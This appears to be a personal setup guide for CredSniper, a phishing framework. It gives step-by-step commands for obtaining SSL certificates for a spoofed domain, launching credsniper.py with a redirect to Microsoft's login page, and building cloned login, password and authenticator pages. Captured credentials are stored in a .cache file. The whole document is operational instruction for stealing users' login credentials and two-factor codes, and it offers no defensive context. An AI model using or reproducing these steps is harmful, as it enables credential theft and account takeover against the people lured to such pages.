# CredSniper

## Setup new site



## Generate new SSL certs

Window 1:
(run)
certbot -d domain.tld --manual --preferred-challenges http certonly
(wait)
(do window 2)

Window 2:
cd to location
python -m SimpleHTTPServer 80

Window 3:
edit file with auth code. 


Move new certs to 
- mv /etc/letsencrypt/live/{domain}.tld/privkey.pem CredSniper/certs/{domain}.tld.privkey.pem

- mv  /etc/letsencrypt/live/{domain}.tld/fullchain.pem CredSniper/certs/{domain}.tld.cert.pem

python credsniper.py --module {name} --port 443 --ssl --verbose --final https://login.microsoftonline.com --hostname domain.tld

## Template Building

### basics
- Create a new module for the client or website type. 
- Rename the .py to the modulename.py
- Change the set_name to the modulename.

### CredSniper/modules/{name}/ 
{name}.py



### CredSniper/modules/{name}/templates/
Main important files for basic usage. 
- login.html
- password.html
- authenticator.html



### Login
The login file will be the initial splash page. 
Wipe the template file, paste your html code in the file. 

Look for the main <form> you will need to replace the action with  action="{{ next_url }}". On submission will take you to the next page. 

You will also need the name of the input for the email. 

### Password
Where the user logs in.


## How the files work

### .cache
holds the logged creds
